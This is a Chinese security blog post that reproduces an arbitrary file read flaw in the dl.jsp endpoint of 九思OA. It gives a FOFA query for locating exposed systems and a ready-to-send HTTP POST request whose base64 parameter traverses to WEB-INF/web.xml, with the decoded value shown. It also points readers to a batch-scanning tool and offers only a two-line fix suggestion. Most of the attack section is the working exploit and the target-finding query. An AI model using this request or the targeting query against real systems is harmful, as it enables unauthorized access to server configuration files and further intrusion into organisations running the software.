#  【漏洞复现】九思OA dl任意文件读取漏洞   
原创 清风  白帽攻防   2024-11-22 01:07  
  
## 免责声明：请勿使用本文中提到的技术进行非法测试或行为。使用本文中提供的信息或工具所造成的任何后果和损失由使用者自行承担，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
简介  
  
九思OA产品由北京九思协同软件有限公司（简称九思软件）研发，专为企事业单位和政府机关提供高端协同办公解决方案，助力客户实现信息化、数字化及智能化转型。该产品融合多种管理理念与OA接口技术，旨在帮助企业打破管理壁垒、整合信息资源，打造高效、规范、实时且低成本的管理体系，支持一体化的技术架构。九思OA以“管理利器，释放组织潜能”为宗旨，为客户提供优质的解决方案、产品和服务，助力构建有序、灵活、高效、开放且具凝聚力的管理和技术支持环境。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0d6tiaoKcPPv7B61WepW7tF99jbbrjaOZrf6pycaibEp1Ut9Xu5vJibBrmBn4IxxyDhVTxMrT4tibF1GQ/640?wx_fmt=png&from=appmsg "")  
漏洞描述  
  
九思OA系统在dl.jsp接口处存在任意文件读取漏洞，攻击者可以利用该漏洞访问系统的关键文件，如配置文件，从而使网站处于极高的安全风险之中，严重影响系统的安全性，增加遭受进一步攻击的可能性。  
fofa语法```
body="/jsoa/login.jsp"
```  
漏洞复现```
POST /jsoa/dl.jsp?JkZpbGVOYW1lPS4uLy4uLy4uL1dFQi1JTkYvd2ViLnhtbCZwYXRoPS9h HTTP/1.1
Host: IP
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip
Connection: close
```  
```
JkZpbGVOYW1lPS4uLy4uLy4uL1dFQi1JTkYvd2ViLnhtbCZwYXRoPS9h
base64解密：&FileName=../../../WEB-INF/web.xml&path=/a
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0d6tiaoKcPPv7B61WepW7tF9XK8P444Yc89GwIanib4HnYBjhzmr0o110Zv4gNHxm7xwv8Fjch7CtGw/640?wx_fmt=png&from=appmsg "")  
  
批量检测（批量检测POC工具请在公众号知识星球获取）：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/yu6trpdUX0d6tiaoKcPPv7B61WepW7tF904SJibPvcJtufDmI8ZPMKm40P8M4sYWqTPonNujwA1CblanvicjiarKOA/640?wx_fmt=png&from=appmsg "")  
修复建议  
  
  
  
  
  
  
1、对用户传入的参数进行限制。  
  
2、关闭互联网暴露面或接口设置访问权限。  
  
  
  
  
  
网安交流群  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/yu6trpdUX0efFOzibVic3qjn100tFgpUIh7ib8g9cKajewKFM5kXP350q21SCLvlgO6yx1tlia8VYxI4j3cv57FqFg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
